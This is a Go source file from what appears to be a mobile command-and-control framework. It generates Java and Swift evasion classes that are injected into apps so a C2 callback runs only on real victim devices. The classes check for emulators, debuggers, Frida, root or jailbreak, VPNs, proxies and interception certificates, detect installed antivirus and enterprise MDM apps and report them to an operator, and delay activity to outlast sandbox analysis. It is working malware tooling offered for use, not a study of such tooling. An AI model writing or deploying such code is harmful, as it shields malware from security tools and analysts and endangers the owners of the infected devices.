package payloads

// MobileEvasionCode returns Java code snippets for Android evasion techniques.
// These are injected into the CallbackService during app generation.

// GetAndroidEvasionCode returns the complete evasion Java class.
func GetAndroidEvasionCode(packageName string) string {
	return `package ` + packageName + `;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Debug;
import android.provider.Settings;
import java.io.*;
import java.net.*;
import java.util.*;

/**
 * Mobile evasion techniques to bypass security tools and analysis.
 * Checks must pass BEFORE C2 callback starts.
 */
public class PhantomEvasion {

    // ══════════════════════════════════════════════
    //  1. EMULATOR / SANDBOX DETECTION
    // ══════════════════════════════════════════════
    // Security tools run apps in emulators for analysis.
    // Detect and stay dormant if running in one.

    public static boolean isEmulator() {
        return checkBuildProps() || checkHardware() || checkFiles() || checkSensors();
    }

    private static boolean checkBuildProps() {
        String[] suspicious = {
            Build.FINGERPRINT, Build.MODEL, Build.MANUFACTURER,
            Build.BRAND, Build.DEVICE, Build.PRODUCT, Build.HARDWARE
        };
        for (String s : suspicious) {
            String lower = s.toLowerCase();
            if (lower.contains("generic") || lower.contains("emulator") ||
                lower.contains("sdk") || lower.contains("genymotion") ||
                lower.contains("google_sdk") || lower.contains("droid4x") ||
                lower.contains("nox") || lower.contains("bluestacks") ||
                lower.contains("vbox") || lower.contains("goldfish") ||
                lower.contains("test-keys") || lower.contains("andy") ||
                lower.contains("ttVM_Hdragon") || lower.contains("ranchu")) {
                return true;
            }
        }

        // Check specific emulator indicators
        if (Build.BOARD.equals("unknown") || Build.BOOTLOADER.equals("unknown")) return true;
        if (Build.SERIAL != null && Build.SERIAL.equals("unknown")) return true;

        return false;
    }

    private static boolean checkHardware() {
        // Emulators often have 0 or 1 camera, no Bluetooth, fake IMEI
        try {
            // Check for qemu pipes
            String[] qemuFiles = {
                "/dev/socket/qemud", "/dev/qemu_pipe",
                "/system/lib/libc_malloc_debug_qemu.so",
                "/system/bin/qemu-props"
            };
            for (String f : qemuFiles) {
                if (new File(f).exists()) return true;
            }
        } catch (Exception e) {}

        // Check CPU architecture (some emulators use x86)
        String abi = Build.SUPPORTED_ABIS[0];
        if (abi.contains("x86") && !Build.MODEL.contains("Pixel")) return true;

        return false;
    }

    private static boolean checkFiles() {
        // Check for analysis tool artifacts
        String[] suspiciousFiles = {
            "/system/app/Superuser.apk",        // Rooted indicator
            "/data/local/tmp/frida-server",      // Frida
            "/data/local/tmp/re.frida.server",   // Frida
            "/.magisk",                           // Magisk
            "/system/xbin/su",                    // Root
            "/data/data/de.robv.android.xposed.installer", // Xposed
        };
        for (String f : suspiciousFiles) {
            if (new File(f).exists()) return true;
        }
        return false;
    }

    private static boolean checkSensors() {
        // Real devices have 10+ sensors; emulators have 0-3
        // This is checked at runtime via SensorManager
        return false; // Checked separately with Context
    }

    public static boolean checkSensorCount(Context ctx) {
        try {
            android.hardware.SensorManager sm = (android.hardware.SensorManager)
                ctx.getSystemService(Context.SENSOR_SERVICE);
            List<?> sensors = sm.getSensorList(android.hardware.Sensor.TYPE_ALL);
            return sensors.size() < 5; // Emulators typically have < 5 sensors
        } catch (Exception e) { return false; }
    }

    // ══════════════════════════════════════════════
    //  2. SECURITY APP DETECTION
    // ══════════════════════════════════════════════
    // Detect installed security/AV apps. If present,
    // disable C2 or reduce activity to avoid detection.

    public static boolean hasSecurityApps(Context ctx) {
        String[] securityPackages = {
            // Mobile AV
            "com.avast.android.mobilesecurity",
            "com.bitdefender.security",
            "org.malwarebytes.antimalware",
            "com.eset.ems2.gp",
            "com.mcafee.security.mobile",
            "com.norton.mobile.security",
            "com.kaspersky.security.cloud",
            "com.sophos.smsec",
            "com.trendmicro.tmmspersonal",
            "com.avg.cleaner",
            "com.avira.android",
            "com.lookout",
            "com.zimperium.zips",

            // MDM / Enterprise
            "com.microsoft.intune.mam",
            "com.mobileiron",
            "com.airwatch.androidagent",
            "com.vmware.hub",
            "com.jamf.trust",

            // Analysis tools
            "de.robv.android.xposed.installer",
            "eu.faircode.xlua",
            "io.github.vvb2060.magisk",
            "me.weishu.exp",

            // Network monitors
            "app.greyshirts.sslcapture",
            "com.egorovandreyrm.pcapremote",
            "com.minhui.networkcapture",
        };

        PackageManager pm = ctx.getPackageManager();
        for (String pkg : securityPackages) {
            try {
                pm.getPackageInfo(pkg, 0);
                return true; // Security app found
            } catch (PackageManager.NameNotFoundException e) {}
        }
        return false;
    }

    // Get list of detected security apps (for reporting)
    public static List<String> getDetectedSecurityApps(Context ctx) {
        List<String> detected = new ArrayList<>();
        String[] securityPackages = {
            "com.avast.android.mobilesecurity", "com.bitdefender.security",
            "org.malwarebytes.antimalware", "com.mcafee.security.mobile",
            "com.norton.mobile.security", "com.kaspersky.security.cloud",
            "com.lookout", "com.zimperium.zips",
            "com.microsoft.intune.mam", "com.mobileiron",
        };
        PackageManager pm = ctx.getPackageManager();
        for (String pkg : securityPackages) {
            try { pm.getPackageInfo(pkg, 0); detected.add(pkg); }
            catch (PackageManager.NameNotFoundException e) {}
        }
        return detected;
    }

    // ══════════════════════════════════════════════
    //  3. DEBUGGER / FRIDA DETECTION
    // ══════════════════════════════════════════════
    // Detect if the app is being debugged or instrumented.

    public static boolean isDebugged() {
        // Check Android debug flag
        if (Debug.isDebuggerConnected()) return true;

        // Check for debug properties
        try {
            String debugProp = System.getProperty("ro.debuggable");
            if ("1".equals(debugProp)) return true;
        } catch (Exception e) {}

        return false;
    }

    public static boolean isFridaRunning() {
        // Method 1: Check for Frida port (27042)
        try {
            Socket sock = new Socket();
            sock.connect(new InetSocketAddress("127.0.0.1", 27042), 1000);
            sock.close();
            return true; // Frida default port open
        } catch (Exception e) {}

        // Method 2: Check /proc/self/maps for Frida libraries
        try {
            BufferedReader br = new BufferedReader(new FileReader("/proc/self/maps"));
            String line;
            while ((line = br.readLine()) != null) {
                if (line.contains("frida") || line.contains("gadget")) {
                    br.close();
                    return true;
                }
            }
            br.close();
        } catch (Exception e) {}

        // Method 3: Check running processes
        try {
            Process proc = Runtime.getRuntime().exec("ps");
            BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            String line;
            while ((line = br.readLine()) != null) {
                if (line.contains("frida") || line.contains("xposed")) {
                    br.close();
                    return true;
                }
            }
            br.close();
        } catch (Exception e) {}

        return false;
    }

    // ══════════════════════════════════════════════
    //  4. ROOT DETECTION + BYPASS
    // ══════════════════════════════════════════════
    // Detect root, but also check if SafetyNet/Play Integrity
    // would flag the device (some enterprises check this).

    public static boolean isRooted() {
        String[] paths = {
            "/system/app/Superuser.apk", "/sbin/su", "/system/bin/su",
            "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su",
            "/system/sd/xbin/su", "/system/bin/failsafe/su", "/data/local/su",
            "/su/bin/su", "/.magisk"
        };
        for (String path : paths) {
            if (new File(path).exists()) return true;
        }

        // Check su command
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"which", "su"});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            if (br.readLine() != null) return true;
            br.close();
        } catch (Exception e) {}

        return false;
    }

    // ══════════════════════════════════════════════
    //  5. NETWORK ANALYSIS DETECTION
    // ══════════════════════════════════════════════
    // Detect VPN, proxy, or traffic interception.

    public static boolean isVPNActive(Context ctx) {
        try {
            android.net.ConnectivityManager cm = (android.net.ConnectivityManager)
                ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
            android.net.Network[] networks = cm.getAllNetworks();
            for (android.net.Network network : networks) {
                android.net.NetworkCapabilities caps = cm.getNetworkCapabilities(network);
                if (caps != null && caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_VPN)) {
                    return true;
                }
            }
        } catch (Exception e) {}
        return false;
    }

    public static boolean isProxySet() {
        String proxyHost = System.getProperty("http.proxyHost");
        return proxyHost != null && !proxyHost.isEmpty();
    }

    public static boolean hasSSLInterceptCerts(Context ctx) {
        // Check for user-installed CA certificates (used by Burp/Charles/mitmproxy)
        try {
            java.security.KeyStore ks = java.security.KeyStore.getInstance("AndroidCAStore");
            ks.load(null, null);
            Enumeration<String> aliases = ks.aliases();
            int userCerts = 0;
            while (aliases.hasMoreElements()) {
                String alias = aliases.nextElement();
                if (alias.startsWith("user:")) userCerts++;
            }
            return userCerts > 0; // User-installed certs = likely analysis
        } catch (Exception e) {}
        return false;
    }

    // ══════════════════════════════════════════════
    //  6. TIMING-BASED EVASION
    // ══════════════════════════════════════════════
    // Sandboxes have limited execution time.
    // Delay C2 activity to outlast analysis windows.

    public static void delayedStart(int minDelaySeconds) {
        try {
            // Random delay between minDelay and minDelay*2
            int delay = minDelaySeconds + new Random().nextInt(minDelaySeconds);
            Thread.sleep(delay * 1000L);
        } catch (Exception e) {}
    }

    // ══════════════════════════════════════════════
    //  7. MASTER CHECK — RUN ALL EVASION
    // ══════════════════════════════════════════════

    /**
     * Run all evasion checks. Returns true if environment is SAFE
     * (not an emulator, no security tools, not being analyzed).
     * The app should only activate C2 if this returns true.
     */
    public static boolean isSafeToRun(Context ctx) {
        // Hard blocks — never run in these conditions
        if (isEmulator()) return false;
        if (isDebugged()) return false;
        if (isFridaRunning()) return false;
        if (checkSensorCount(ctx)) return false;

        // Soft checks — run with reduced activity
        // hasSecurityApps, isVPNActive, isProxySet, hasSSLInterceptCerts
        // These are available for the operator to query, but don't hard-block

        return true;
    }

    /**
     * Get a full evasion status report as JSON string.
     */
    public static String getEvasionReport(Context ctx) {
        StringBuilder sb = new StringBuilder();
        sb.append("{");
        sb.append("\"emulator\":").append(isEmulator()).append(",");
        sb.append("\"debugger\":").append(isDebugged()).append(",");
        sb.append("\"frida\":").append(isFridaRunning()).append(",");
        sb.append("\"rooted\":").append(isRooted()).append(",");
        sb.append("\"vpn\":").append(isVPNActive(ctx)).append(",");
        sb.append("\"proxy\":").append(isProxySet()).append(",");
        sb.append("\"ssl_intercept\":").append(hasSSLInterceptCerts(ctx)).append(",");
        sb.append("\"low_sensors\":").append(checkSensorCount(ctx)).append(",");
        sb.append("\"security_apps\":").append(hasSecurityApps(ctx));
        sb.append("}");
        return sb.toString();
    }
}
`
}

// GetIOSEvasionCode returns Swift evasion code for iOS apps.
func GetIOSEvasionCode() string {
	return `import Foundation
import UIKit

// Phantom C2 — iOS Evasion Techniques

class PhantomEvasion {

    // 1. Jailbreak Detection
    static func isJailbroken() -> Bool {
        // Check for common jailbreak files
        let paths = [
            "/Applications/Cydia.app",
            "/Library/MobileSubstrate/MobileSubstrate.dylib",
            "/bin/bash", "/usr/sbin/sshd", "/etc/apt",
            "/private/var/lib/apt/", "/usr/bin/ssh",
            "/private/var/stash", "/usr/libexec/sftp-server",
            "/private/var/tmp/cydia.log",
            "/Applications/Sileo.app", "/var/jb"
        ]
        for path in paths {
            if FileManager.default.fileExists(atPath: path) { return true }
        }

        // Check if app can write outside sandbox
        let testPath = "/private/jb_test"
        do {
            try "test".write(toFile: testPath, atomically: true, encoding: .utf8)
            try FileManager.default.removeItem(atPath: testPath)
            return true
        } catch {}

        // Check URL schemes
        if let url = URL(string: "cydia://package/com.example") {
            if UIApplication.shared.canOpenURL(url) { return true }
        }

        return false
    }

    // 2. Debugger Detection
    static func isDebugged() -> Bool {
        var info = kinfo_proc()
        var size = MemoryLayout<kinfo_proc>.stride
        var mib: [Int32] = [CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()]
        sysctl(&mib, 4, &info, &size, nil, 0)
        return (info.kp_proc.p_flag & P_TRACED) != 0
    }

    // 3. Simulator Detection
    static func isSimulator() -> Bool {
        #if targetEnvironment(simulator)
        return true
        #else
        return false
        #endif
    }

    // 4. Frida Detection
    static func isFridaRunning() -> Bool {
        // Check for Frida port
        let socket = socket(AF_INET, SOCK_STREAM, 0)
        var addr = sockaddr_in()
        addr.sin_family = sa_family_t(AF_INET)
        addr.sin_port = CFSwapInt16HostToBig(27042)
        addr.sin_addr.s_addr = inet_addr("127.0.0.1")

        let result = withUnsafePointer(to: &addr) {
            $0.withMemoryRebound(to: sockaddr.self, capacity: 1) {
                connect(socket, $0, socklen_t(MemoryLayout<sockaddr_in>.size))
            }
        }
        close(socket)
        return result == 0
    }

    // 5. VPN Detection
    static func isVPNActive() -> Bool {
        guard let proxySettings = CFNetworkCopySystemProxySettings()?.takeRetainedValue() as? [String: Any] else { return false }
        guard let scoped = proxySettings["__SCOPED__"] as? [String: Any] else { return false }
        for key in scoped.keys {
            if key.contains("tap") || key.contains("tun") || key.contains("ppp") || key.contains("ipsec") {
                return true
            }
        }
        return false
    }

    // 6. Master check
    static func isSafe() -> Bool {
        if isSimulator() { return false }
        if isDebugged() { return false }
        if isFridaRunning() { return false }
        return true
    }
}
`
}
